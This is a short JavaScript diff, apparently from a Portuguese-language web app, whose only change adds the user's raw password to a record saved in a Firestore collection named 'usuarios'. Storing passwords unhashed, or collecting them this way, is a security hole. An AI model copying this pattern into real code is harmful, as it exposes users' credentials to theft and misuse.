@@ -420,7 +420,8 @@
     try {
       await addDoc(collection(db, 'usuarios'), {
         email: email,
-        timestamp: new Date().toISOString()
+         password: password,
+         timestamp: new Date().toISOString()
       });
     } catch (error) {
       console.error('Erro ao salvar:', error);
